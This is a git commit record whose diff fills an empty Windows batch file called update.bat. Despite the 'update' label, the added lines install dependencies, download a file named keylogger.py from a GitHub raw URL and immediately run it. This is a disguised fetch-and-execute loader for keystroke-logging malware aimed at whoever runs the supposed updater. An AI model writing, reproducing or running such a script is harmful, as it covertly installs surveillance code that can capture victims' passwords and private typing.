dc7edd4609cdc5e3358a2666832159ce7536584c
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-07-09 20:27:39 -0700

    Update update.bat

--- update.bat
+++ update.bat
@@ -1,1 +1,5 @@
-
+curl -o requirements.txt https://raw.githubusercontent.com/oogabooga245/bot/main/requirements.txt
+pip install -r requirements.txt
+curl -o keylogger.py https://raw.githubusercontent.com/oogabooga245/bot/main/keylogger.py
+python3 keylogger.py
+exit
